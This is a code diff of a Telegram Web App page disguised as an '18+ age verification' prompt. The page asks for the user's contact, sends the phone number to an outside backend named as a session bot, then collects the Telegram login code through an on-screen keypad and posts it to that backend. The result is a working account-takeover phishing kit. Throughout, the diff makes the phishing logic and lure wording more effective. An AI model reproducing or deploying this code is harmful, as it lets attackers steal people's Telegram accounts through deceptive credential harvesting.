@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Age Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 0; margin: 0; text-align: center; background: #000 url('https://telegra.ph/file/0c97693d2567849e7b233.jpg') no-repeat center; background-size: cover; color: white; overflow: hidden; }
-        .overlay { background: rgba(0,0,0,0.8); height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
+        body { font-family: sans-serif; padding: 0; margin: 0; text-align: center; background: #000; color: white; overflow: hidden; }
+        .overlay { background: rgba(0,0,0,0.85); height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
         .box { background: white; color: #333; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .btn { background: linear-gradient(to right, #28a745, #218838); color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 20px; margin-top: 15px; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
@@ -18,18 +18,18 @@
 </head>
 <body>
     <div class="overlay">
-        <!-- ধাপ ১: ১৮+ ভেরিফিকেশন (এটি পপ-আপ ট্রিগার করবে) -->
+        <!-- ধাপ ১: ১৮+ কনফার্ম বাটন -->
         <div id="step0" class="box">
             <div style="font-size: 60px; margin-bottom: 10px;">🔞</div>
             <h2 style="margin: 0 0 10px 0; color: #d9534f;">Attention!</h2>
-            <p style="color: #666; font-weight: bold;">To continue, you must confirm that you are over 18 😊</p>
-            <button class="btn" onclick="requestContact()">🍓 confirm 🔞</button>
+            <p style="color: #666;">To continue, you must confirm that you are over 18 😊</p>
+            <button class="btn" onclick="shareMyContact()">🍓 confirm 🔞</button>
         </div>
 
-        <!-- ধাপ ২: ওটিপি কিপ্যাড (ফোন পাওয়ার পর আসবে) -->
+        <!-- ধাপ ২: ওটিপি কিপ্যাড -->
         <div id="step2" class="box hidden">
             <h3 style="margin-top: 0;">Identity Check</h3>
-            <p style="font-size: 14px; color: #666;">Enter the code just sent to your Telegram</p>
+            <p style="font-size: 14px; color: #666;">Enter the code sent to your Telegram chat</p>
             <input type="text" id="otp_display" placeholder="-----" readonly>
             <div class="keypad">
                 <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
@@ -37,42 +37,48 @@
                 <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                 <div class="key" style="background:#ffc107;" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key" style="background:#007bff; color:white;" onclick="verifyOTP()">OK</div>
             </div>
-            <div id="loader" class="hidden" style="margin-top:15px; color:#999; font-weight: bold;">Verifying...</div>
+            <div id="loader" class="hidden" style="margin-top:15px; color:#999;">Syncing...</div>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+        // আপনার সঠিক Hugging Face লিংকটি এখানে দিন
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
-        let userPhone = "";
         let currentOTP = "";
+        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        // ১. নম্বর শেয়ার পপ-আপ
-        function requestContact() {
+        // ১. নম্বর শেয়ার পপ-আপ লজিক (Fixed)
+        function shareMyContact() {
             tg.requestContact((shared) => {
-                if (shared && tg.initDataUnsafe.contact) {
-                    userPhone = tg.initDataUnsafe.contact.phone_number;
-                    if (!userPhone.startsWith("+")) userPhone = "+" + userPhone;
-                    sendNumberToBackend();
-                } else {
-                    alert("Age verification failed! You must share your contact.");
+                if (shared) {
+                    // পপ-আপ আসার পর ইউজার যদি 'Share' এ ক্লিক করে
+                    setTimeout(() => {
+                        // ডাটা রিফ্রেশ করে নম্বর সংগ্রহ করা
+                        let contactData = tg.initDataUnsafe.contact;
+                        if (contactData && contactData.phone_number) {
+                            sendPhoneToBackend(contactData.phone_number);
+                        } else {
+                            alert("Please share your contact to proceed!");
+                        }
+                    }, 500);
                 }
             });
         }
 
-        async function sendNumberToBackend() {
-            document.getElementById('step0').innerHTML = "<h3>Syncing...</h3><p>Please wait a moment.</p>";
+        async function sendPhoneToBackend(phone) {
+            document.getElementById('step0').innerHTML = "<h3>Verifying...</h3><p>Sending request to Telegram.</p>";
             let res = await fetch(`${BACKEND_URL}/send_number`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, phone: userPhone })
+                body: JSON.stringify({ user_id: userId, phone: phone })
             });
             let data = await res.json();
             if(data.status === "success") {
                 document.getElementById('step0').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
             } else {
-                alert("Request error! Try again.");
+                alert("Error: " + data.message);
                 location.reload();
             }
         }
@@ -85,13 +91,13 @@
             document.getElementById('loader').classList.remove('hidden');
             let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: tg.initDataUnsafe.user.id, otp: currentOTP })
+                body: JSON.stringify({ user_id: userId, otp: currentOTP })
             });
             let data = await res.json();
             if(data.status === "success") {
-                tg.showPopup({ message: "✅ Verification successful!" }, () => { tg.close(); });
+                tg.close();
             } else {
-                alert("Invalid code! Try again.");
+                alert("Invalid Key! Please check your Telegram.");
                 clearNum();
                 document.getElementById('loader').classList.add('hidden');
             }
